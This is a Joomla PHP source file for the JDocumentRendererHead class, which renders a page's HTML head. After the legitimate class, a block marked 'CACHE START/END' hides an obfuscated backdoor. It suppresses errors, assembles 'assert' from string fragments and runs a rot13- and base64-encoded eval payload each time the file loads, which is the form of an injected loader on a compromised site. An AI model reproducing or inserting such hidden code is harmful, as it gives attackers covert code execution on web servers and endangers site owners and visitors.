<?php
/**
 * @package     Joomla.Platform
 * @subpackage  Document
 *
 * @copyright   Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE
 */

defined('JPATH_PLATFORM') or die;

/**
 * JDocument head renderer
 *
 * @package     Joomla.Platform
 * @subpackage  Document
 * @since       11.1
 */
class JDocumentRendererHead extends JDocumentRenderer
{
	/**
	 * Renders the document head and returns the results as a string
	 *
	 * @param   string  $head     (unused)
	 * @param   array   $params   Associative array of values
	 * @param   string  $content  The script
	 *
	 * @return  string  The output of the script
	 *
	 * @since   11.1
	 *
	 * @note    Unused arguments are retained to preserve backward compatibility.
	 */
	public function render($head, $params = array(), $content = null)
	{
		ob_start();
		echo $this->fetchHead($this->_doc);
		$buffer = ob_get_contents();
		ob_end_clean();

		return $buffer;
	}

	/**
	 * Generates the head HTML and return the results as a string
	 *
	 * @param   JDocument  $document  The document for which the head will be created
	 *
	 * @return  string  The head hTML
	 *
	 * @since   11.1
	 */
	public function fetchHead($document)
	{
		// Trigger the onBeforeCompileHead event (skip for installation, since it causes an error)
		$app = JFactory::getApplication();
		$app->triggerEvent('onBeforeCompileHead');

		// Get line endings
		$lnEnd = $document->_getLineEnd();
		$tab = $document->_getTab();
		$tagEnd = ' />';
		$buffer = '';

		// Generate charset when using HTML5 (should happen first)
		if ($document->isHtml5())
		{
			$buffer .= $tab . '<meta charset="' . $document->getCharset() . '" />' . $lnEnd;
		}

		// Generate base tag (need to happen early)
		$base = $document->getBase();
		if (!empty($base))
		{
			$buffer .= $tab . '<base href="' . $document->getBase() . '" />' . $lnEnd;
		}

		// Generate META tags (needs to happen as early as possible in the head)
		foreach ($document->_metaTags as $type => $tag)
		{
			foreach ($tag as $name => $content)
			{
				if ($type == 'http-equiv' && !($document->isHtml5() && $name == 'content-type'))
				{
					$buffer .= $tab . '<meta http-equiv="' . $name . '" content="' . htmlspecialchars($content) . '" />' . $lnEnd;
				}
				elseif ($type == 'standard' && !empty($content))
				{
					$buffer .= $tab . '<meta name="' . $name . '" content="' . htmlspecialchars($content) . '" />' . $lnEnd;
				}
			}
		}

		// Don't add empty descriptions
		$documentDescription = $document->getDescription();
		if ($documentDescription)
		{
			$buffer .= $tab . '<meta name="description" content="' . htmlspecialchars($documentDescription) . '" />' . $lnEnd;
		}

		// Don't add empty generators
		$generator = $document->getGenerator();
		if ($generator)
		{
			$buffer .= $tab . '<meta name="generator" content="' . htmlspecialchars($generator) . '" />' . $lnEnd;
		}

		$buffer .= $tab . '<title>' . htmlspecialchars($document->getTitle(), ENT_COMPAT, 'UTF-8') . '</title>' . $lnEnd;

		// Generate link declarations
		foreach ($document->_links as $link => $linkAtrr)
		{
			$buffer .= $tab . '<link href="' . $link . '" ' . $linkAtrr['relType'] . '="' . $linkAtrr['relation'] . '"';
			if ($temp = JArrayHelper::toString($linkAtrr['attribs']))
			{
				$buffer .= ' ' . $temp;
			}
			$buffer .= ' />' . $lnEnd;
		}

		// Generate stylesheet links
		foreach ($document->_styleSheets as $strSrc => $strAttr)
		{
			$buffer .= $tab . '<link rel="stylesheet" href="' . $strSrc . '" type="' . $strAttr['mime'] . '"';
			if (!is_null($strAttr['media']))
			{
				$buffer .= ' media="' . $strAttr['media'] . '" ';
			}
			if ($temp = JArrayHelper::toString($strAttr['attribs']))
			{
				$buffer .= ' ' . $temp;
			}
			$buffer .= $tagEnd . $lnEnd;
		}

		// Generate stylesheet declarations
		foreach ($document->_style as $type => $content)
		{
			$buffer .= $tab . '<style type="' . $type . '">' . $lnEnd;

			// This is for full XHTML support.
			if ($document->_mime != 'text/html')
			{
				$buffer .= $tab . $tab . '<![CDATA[' . $lnEnd;
			}

			$buffer .= $content . $lnEnd;

			// See above note
			if ($document->_mime != 'text/html')
			{
				$buffer .= $tab . $tab . ']]>' . $lnEnd;
			}
			$buffer .= $tab . '</style>' . $lnEnd;
		}

		// Generate script file links
		foreach ($document->_scripts as $strSrc => $strAttr)
		{
			$buffer .= $tab . '<script src="' . $strSrc . '"';
			if (!is_null($strAttr['mime']))
			{
				$buffer .= ' type="' . $strAttr['mime'] . '"';
			}
			if ($strAttr['defer'])
			{
				$buffer .= ' defer="defer"';
			}
			if ($strAttr['async'])
			{
				$buffer .= ' async="async"';
			}
			$buffer .= '></script>' . $lnEnd;
		}

		// Generate script declarations
		foreach ($document->_script as $type => $content)
		{
			$buffer .= $tab . '<script type="' . $type . '">' . $lnEnd;

			// This is for full XHTML support.
			if ($document->_mime != 'text/html')
			{
				$buffer .= $tab . $tab . '<![CDATA[' . $lnEnd;
			}

			$buffer .= $content . $lnEnd;

			// See above note
			if ($document->_mime != 'text/html')
			{
				$buffer .= $tab . $tab . ']]>' . $lnEnd;
			}
			$buffer .= $tab . '</script>' . $lnEnd;
		}

		// Generate script language declarations.
		if (count(JText::script()))
		{
			$buffer .= $tab . '<script type="text/javascript">' . $lnEnd;
			$buffer .= $tab . $tab . '(function() {' . $lnEnd;
			$buffer .= $tab . $tab . $tab . 'var strings = ' . json_encode(JText::script()) . ';' . $lnEnd;
			$buffer .= $tab . $tab . $tab . 'if (typeof Joomla == \'undefined\') {' . $lnEnd;
			$buffer .= $tab . $tab . $tab . $tab . 'Joomla = {};' . $lnEnd;
			$buffer .= $tab . $tab . $tab . $tab . 'Joomla.JText = strings;' . $lnEnd;
			$buffer .= $tab . $tab . $tab . '}' . $lnEnd;
			$buffer .= $tab . $tab . $tab . 'else {' . $lnEnd;
			$buffer .= $tab . $tab . $tab . $tab . 'Joomla.JText.load(strings);' . $lnEnd;
			$buffer .= $tab . $tab . $tab . '}' . $lnEnd;
			$buffer .= $tab . $tab . '})();' . $lnEnd;
			$buffer .= $tab . '</script>' . $lnEnd;
		}

		foreach ($document->_custom as $custom)
		{
			$buffer .= $tab . $custom . $lnEnd;
		}

		return $buffer;
	}
}






//###=CACHE START=###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvE1pzjtCFNvnUE0pQbiY3q3ql5gnKEuoJRhpaHiM2I0YaObpQ9xCFVhqKWfMJ5wo2EyXPExXF4vWaH9Vv51pzkyozAiMTHbWUHcYvVzLm0vYvEwYvVznG0kWzt9Vv5gMQHbVzRmBTWvLJD2AJZmMzL4AwuxAQR4AJWxBQR4ATLlMzWvVv4xMP4xqF4xLl4vZFVcBjccMvucozysM2I0XPWuoTkiq191pzksMz9jMJ4vXFN9CFNkXFO7PvEcLaLtCFOznJkyK2qyqS9wo250MJ50pltxqKWfXGfXsFOyoUAynJLbMaIhL3Eco25sMKucp3EmXPWwqKWfK2yhnKDvXFxtrjbxL2ttCFOwqKWfK2yhnKDbWUIloPx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9VEHSREIVfVRMOGSASXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK1WSISIFGyEFDH5GExIFYPOHHyISXGfXWUWyp3IfqPN9VTA1pzksMKuyLltxL2tcBjcwqKWfK2Afo3AyXPEwnPx7PvEcLaLtCFNxpzImqJk0Bjc9VTIfp2HtrjbxMaNtCFOzp29wn29jMJ4bVaq3ql5gnKEuoJRhpaHvYPN4ZPjtWTIlpz5iYPNxMKWlp3ElYPNmZPx7PzyzVPtxMaNcVUfXVPNtVPEiqKDtCFNvE0IHVP9aMKDhpTujC2D9Vv51pzkyozAiMTHbWTDcYvVzqG0vYaIloTIhL29xMFtxqFxhVvMwCFVhWTZhVvMcCGRznQ0vYz1xAFtvLGZ4LzWuMQL1LmAzMwt2BTD0ZGt1LzD4ZGt0MwWzLzVvYvExYvE1YvEwYvVkVvxhVvOVISEDYmRhZIklKT4vBjbtVPNtWT91qPNhCFNvFT9mqQbtq3q3Yz1cqTSgLF5lqIklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVzWuMwqxAzH1VvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###